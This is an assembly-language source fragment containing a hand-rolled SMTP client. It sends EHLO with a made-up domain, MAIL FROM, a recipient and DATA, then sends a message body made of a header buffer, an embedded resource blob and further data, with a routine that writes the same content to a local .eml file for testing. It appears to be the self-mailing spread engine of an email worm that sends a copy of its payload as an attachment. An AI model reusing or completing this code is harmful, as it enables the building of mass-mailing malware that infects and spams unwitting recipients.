.code
.data?
fhandlethis3 dd ?
sizethis3 dd ?
memthis3 dd ?
wsadata WSADATA<?>

sockAddr sockaddr_in <?>
buffmsg db 256 dup(?)

filehandlethis3 dd ?
hSocket dd ?

.data
file db "c:\like.eml",0;used when target procedure enabled

hellomsg db "EHLO likeno.com",0dh,0ah,0
mailmsg db "MAIL FROM: <",0                  
pooh db ">",0dh,0ah,0
rset db "rset",0dh,0ah,0

sendmsg db 256 dup(0)


datamsg db "data",0dh,0ah,0
dot_it db  13,10,".",13,10, 0

.code

;jmp target
Intiate_Mail proc

invoke WSAStartup,001h, addr wsadata
test eax,eax
jnz another_time



invoke socket,AF_INET ,SOCK_STREAM,IPPROTO_TCP

mov hSocket,eax

mov sockAddr.sin_family,AF_INET
invoke htons,25
mov sockAddr.sin_port,ax
invoke gethostbyname,offset host_name
cmp eax,0
je do_cleanup
mov eax,[eax+12]
mov eax,[eax]
mov eax,[eax]
mov sockAddr.sin_addr.S_un.S_addr,eax

another_time:
mov eax,1
;invoke MessageBox,0,offset email_address,0,0
ret

do_cleanup:



invoke WSACleanup
ret



Intiate_Mail endp

c_send proc
invoke connect,hSocket,addr sockAddr,sizeof sockAddr
test eax,eax
jnz do_cleanup

invoke recv,hSocket,offset buffmsg,512,0


;invoke MessageBox,0,offset buffmsg,0,0
invoke lstrlen,offset hellomsg
invoke send,hSocket,offset hellomsg,eax,0
invoke recv,hSocket,offset buffmsg,512,0



invoke lstrcat,offset sendmsg,offset mailmsg
invoke lstrcat,offset sendmsg,offset mailfrom
invoke lstrcat,offset sendmsg,offset extend3
invoke lstrcat,offset sendmsg,offset pooh
;invoke lstrcat,offset sendmsg,offset crlf
invoke lstrlen,offset sendmsg

invoke send,hSocket,offset sendmsg,eax,0
invoke recv,hSocket,offset buffmsg,512,0

mov eax,offset buffmsg
cmp word ptr [eax],"052"
jne do_cleanup

;invoke MessageBox,0,offset buffmsg,offset sendmsg,0

invoke RtlZeroMemory,offset sendmsg,256


invoke lstrlen,offset email_address


invoke send,hSocket,offset email_address,eax ,0

invoke recv,hSocket,offset buffmsg,512,0

mov eax,offset buffmsg
cmp word ptr [eax],"052"
jne do_cleanup

;invoke MessageBox,0,offset buffmsg,0,0

invoke send,hSocket,offset datamsg,6,0
invoke recv,hSocket,offset buffmsg,512,0
;invoke MessageBox,0,offset buffmsg,0,0

invoke lstrlen,offset bufferthis2
invoke send,hSocket,offset bufferthis2,eax,0
invoke send,hSocket,resmem,ressize,0
invoke send,hSocket,offset crlf,2,0
invoke send,hSocket,ultmem,new_size,0
invoke send,hSocket,offset crlf,2,0
invoke send,hSocket,offset crlf,2,0
invoke send,hSocket,offset separator,sizeof separator,0

invoke send,hSocket,offset dot_it,5,0
invoke recv,hSocket,offset buffmsg,512,0
;invoke MessageBox,0,offset buffmsg,0,0

invoke send,hSocket,offset rset ,6,0
invoke recv,hSocket,offset buffmsg,512,0


;invoke MessageBox,0,offset buffmsg,0,0

do_cleanup:
;invoke MessageBox,0,offset buffmsg,0,0
invoke WSACleanup

ret
c_send endp

target proc      ;it was just a testing method in case i was offline :/

invoke CreateFile,offset file,40000000h,0,0,2,0,0
mov filehandlethis3,eax
invoke lstrlen,offset bufferthis2
invoke WriteFile,filehandlethis3,offset bufferthis2,eax,offset bwr,0
invoke WriteFile,filehandlethis3,resmem,ressize,offset bwr,0
invoke WriteFile,filehandlethis3,offset crlf,2,offset bwr,0
invoke WriteFile,filehandlethis3,ultmem,new_size,offset bwr,0
invoke WriteFile,filehandlethis3,offset crlf,2,offset bwr,0
invoke WriteFile,filehandlethis3,offset crlf,2,offset bwr,0
invoke WriteFile,filehandlethis3,offset crlf,2,offset bwr,0

invoke WriteFile,filehandlethis3,offset separator,sizeof separator,offset bwr,0

invoke CloseHandle,filehandlethis3

ret
target endp


